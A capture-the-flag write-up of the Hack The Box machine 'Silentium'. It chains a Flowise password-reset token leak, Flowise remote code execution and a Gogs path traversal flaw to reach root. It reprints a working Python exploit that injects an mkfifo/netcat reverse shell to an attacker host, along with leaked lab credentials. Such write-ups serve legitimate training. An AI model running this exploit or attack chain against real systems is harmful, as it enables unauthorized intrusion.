---
machineName: Silentium
difficulty: Easy
Status: Done
OS: Linux
start_time: 2026-04-25T19:45:00
end_time: 2026-04-27T15:51:00
player_position: "5154"
CVEs:
  - "[CVE-2025-58434](https://nvd.nist.gov/vuln/detail/CVE-2025-58434)"
  - "[CVE-2025-8110](https://nvd.nist.gov/vuln/detail/CVE-2025-8110)"
CWEs:
  - "[CWE-306](http://cwe.mitre.org/data/definitions/306.html)"
  - "[CWE-22](http://cwe.mitre.org/data/definitions/22.html)"
tools:
  - nmap
  - ffuf
  - wafw00f
  - ZAP
exploited_programs:
  - Flowise
  - Gogs
open_ports:
  - "22"
  - "80"
aliases:
  - Account takeover with leaked credentials in password reset -> CVE (RCE) for first foothold -> find service running as root, and use CVE (Path Traversal) to gain acces to it.
tags:
  - "#HTB"
iconurl: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/601d72b592e6b78aee56dbc086ec7089.png
---
<div style="text-align: center;">
  <img
    src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/601d72b592e6b78aee56dbc086ec7089.png"
    width="200"
  >
</div>

# Initial Recon

## Nmap
```sh
➜  Silentium [I] : nmap -sV -sC -p- 10.129.245.103                                               [25/04/26 | 7:32:58]
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-25 19:33 +0200
Nmap scan report for 10.129.245.103
Host is up (0.016s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.41 seconds
```
## FFUF
I tried:
- VHOST fuzzing
```sh
ffuf -u http://silentium.htb/ -H "Host: FUZZ.silentium.htb" \            
-w ~/Applications/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
-ac
```
- Subdomain fuzzing
```sh
ffuf -u http://FUZZ.silentium.htb/ \                                         
-w ~/Applications/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
-fs 8753
```
- Directory fuzzing
```sh
ffuf -u http://silentium.htb/FUZZ -w ~/Applications/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt:FUZZ
```

The VHOST Fuzzing found a `staging` Subdomain. We add it to `/etc/hosts` and we find a landing page:

![[images/htb_images/Pasted image 20260425200617.png]]

At this point I went haywire with trying to enumerate users, because when I inputted a mail, the webpage clearly said, **user not found**, My guess was that, if i found a valid mail, it would say wrong password instead, So yeah I mixed in the **[ZAP](https://www.zaproxy.org) Fuzzer** Username and Email prefix lists from SecLists, this didn’t give anything useful.

Then I took a look back at the silentium page, and found possible contact mails:
![[images/htb_images/Pasted image 20260425204338.png]]

I decided to try ben because well, it was the simpler name, and of course:
![[images/htb_images/Pasted image 20260425204524.png]]

We’ve got an existing user!

At this point I tried to Brute Force his password with **[ZAP](https://www.zaproxy.org)**, but no success, I lost a fair amout of time tinkering with requests in the **ZAP** proxy but no succes. I also tried to manually exploit this [CVE-2025-61913](https://nvd.nist.gov/vuln/detail/CVE-2025-61913) with no luck. 

Then I realized something, I’ve paid no attention to the first reset password page, as I thought it was useless, as they often are in these challenges.

After a bit of search i found this [ CVE-2025-58434 Poc](https://github.com/advisories/GHSA-wgpv-6j63-x5ph)

I tried this:

![[images/htb_images/Pasted image 20260425212739.png]]

And my proxy received this: 
```
HTTP/1.1 201 Created
Server: nginx/1.24.0 (Ubuntu)
Date: Sat, 25 Apr 2026 19:26:41 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 579
Connection: keep-alive
Access-Control-Allow-Origin: http://staging.silentium.htb
Vary: Origin
Access-Control-Allow-Credentials: true
ETag: W/"243-uoVz+j6pSRzQzP2F4SnCSVA8rXg"

{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"lqbZpFQUeNLyhGslW623LdxtcPkLZXjIspMsINjeLAQN8YuI6uj4bi3InRWYOQWK","tokenExpiry":"2026-04-25T19:41:41.419Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-25T19:26:41.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}
```

Immediately **[ZAP](https://www.zaproxy.org)** warned me of a possibly leaked hash:
```
"credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG"
```

but most importantly, we got:
```
"tempToken":"lqbZpFQUeNLyhGslW623LdxtcPkLZXjIspMsINjeLAQN8YuI6uj4bi3InRWYOQWK"
```

which is the token needed to reset a password in the **change your password here** section!

So I successfully changed ben password.

Now I got into the [Flowise Dashboard](https://flowiseai.com/)

I quickly found this [CVE-2026-41137 PoC](https://github.com/advisories/GHSA-9wc7-mj3f-74xv), I tried using the provided poc, and changed a lot of stuff, but I got some errors about pandas not being installed, the environment was restricted, I finally found this PoC:

```python
import requests
import argparse
import sys

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-k", "--key", required=True)
    parser.add_argument("-l", "--lhost", required=True)
    parser.add_argument("-p", "--lport", required=True)
    args = parser.parse_args()

    url = f"http://{args.target}/api/v1/node-load-method/customMCP"
    rev_shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {args.lhost} {args.lport} >/tmp/f"
    js_code = f'({{x:(function(){{const cp = process.mainModule.require("child_process");cp.execSync("{rev_shell}");return 1;}})()}})'

    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {args.key}"
    }

    data = {
        "loadMethod": "listActions",
        "inputs": {
            "mcpServerConfig": js_code
        }
    }

    print(f"[*] Targeting: {url}")
    print(f"[*] Payload: {args.lhost}:{args.lport}")

    try:
        response = requests.post(url, json=data, headers=headers, timeout=15)
        print(f"[*] Status: {response.status_code}")
        print(f"[*] Response: {response.text}")
    except requests.exceptions.Timeout:
        print("[+] Success: Connection established (check your listener)")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
```

Which did sensibly the same thing, I launched an [netcat](https://nc110.sourceforge.io/) listener `nc -nlvp 4444` and the previous script.
# First Foothold

Here we land in what seems to be a restricted [Docker](https://www.docker.com/)

 I launch [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) asap, which confirms it:
 
```
```sh 
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present (if any): (T1613)
/usr/bin/nsenter
/usr/bin/unshare
/usr/sbin/chroot

╔══════════╣ Container details (T1613,T1611)
═╣ Is this a container? ........... [docker](https://www.docker.com)
═╣ [Docker](https://www.docker.com) marker .................. /.dockerenv═╣ Interesting runtime sockets ... ═╣ Any running containers? ........ No

╔══════════╣ [Docker](https://www.docker.com) Container details (T1613)
═╣ Am I inside [Docker](https://www.docker.com) group ....... No
═╣ Looking and enumerating runtime sockets:
═╣ [Docker](https://www.docker.com) version ................. Not Found
═╣ Vulnerable to CVE-2019-5736 .... Not Found
═╣ Vulnerable to CVE-2019-13139 ... Not Found
═╣ Vulnerable to CVE-2021-41091 ... Not Found
═╣ Rootless [Docker](https://www.docker.com)? ............... No

```
## 2nd Recon

Linpeas also show me some interesting environment variables:
```
SMTP_HOST=mailhog
SMTP_PASSWORD=r04D!!_R4ge
```

I try to connect through SSH to the ben user, suspecting password indeed, and sure enough it works!

We se there’s a [Gogs](https://gogs.io/getting-started/introduction) server running as **root**, which makes sense as this is the **staging** VHOST,  but at the same time is weird because there’s no need to run it as **root**, and is finally the demise of this machine.

```sh
ben@silentium:~$ ps aux | grep root
root        1527  0.0  2.0 1812636 80820 ?       Ssl  12:12   0:03 /opt/gogs/gogs/gogs web
```

I tunnel the service through SSH (run this on attacker machine):
```
[ssh](https://www.openssh.com) -L 3001:127.0.0.1:3001 ben@10.129.31.50 
```

And we visit 

![[images/htb_images/Pasted image 20260427164638.png]]

## Privilege Escalation

I found the following CVE when looking online [CVE-2025-8110 PoC](https://github.com/zAbuQasem/gogs-CVE-2025-8110/blob/main/CVE-2025-8110.py)

and after modifying it quite a bit It worked, I launched the modified script, with a listener in the already compromised machine, I could have port forwarded to my machine but I got lazy, this machine took me longer than expected!

___

# Wasted Time
Things I did that didn’t work
___
The flowise login api had some weird behaviors:

when submitting this: 
```
POST http://staging.silentium.htb/api/v1/auth/login HTTP/1.1
host: staging.silentium.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:150.0) Gecko/20100101 [Firefox](https://www.mozilla.org/firefox/)/150.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
x-request-from: internal
content-length: 43
Origin: http://staging.silentium.htb
Connection: keep-alive
Referer: http://staging.silentium.htb/signin
Priority: u=0

{"email":"ben@silentium.htb","password":""}
```

The server actually answered with the web page html (if done through browser it flickered back to the login page), I thought we had to find some hidden information here, but it wasn’t the case.

I also tried brute forcing ben password, which was rather long and useless.

I had some problems  making the first CVE PoC work.

And finally I had some linpeas output which seemed as a good PE vector, but I gave up on it:

```
 ╔══════════╣ Writable root-owned executables I can modify (max 200) (T1574.009,T1574.010)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
-rwxrwxrwx 1 root root 1446024 Mar 31  2024 /usr/bin/[bash](https://www.gnu.org/software/bash/)
```

This seemed way too complicated, and would probably break the system, so I didn’t attempt to do it.
There were also some other linpeas false positives which took me some time to understand.

# References
-  CVE-2025-58434 Poc: https://github.com/advisories/GHSA-wgpv-6j63-x5ph
- CVE-2025-58434: https://nvd.nist.gov/vuln/detail/CVE-2025-58434
- CVE-2025-61913: https://nvd.nist.gov/vuln/detail/CVE-2025-61913
- CVE-2025-8110: https://nvd.nist.gov/vuln/detail/CVE-2025-8110
- CVE-2025-8110 PoC: https://github.com/zAbuQasem/gogs-CVE-2025-8110/blob/main/CVE-2025-8110.py
- CVE-2026-41137 PoC: https://github.com/advisories/GHSA-9wc7-mj3f-74xv
- CWE-22: http://cwe.mitre.org/data/definitions/22.html
- CWE-306: http://cwe.mitre.org/data/definitions/306.html
- Docker: https://www.docker.com
- Flowise Dashboard: https://flowiseai.com/
- Gogs: https://gogs.io/getting-started/introduction
- ZAP: https://www.zaproxy.org
- bash: https://www.gnu.org/software/bash/
- docker: https://www.docker.com
- linpeas: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
- netcat: https://nc110.sourceforge.io/
- ssh: https://www.openssh.com
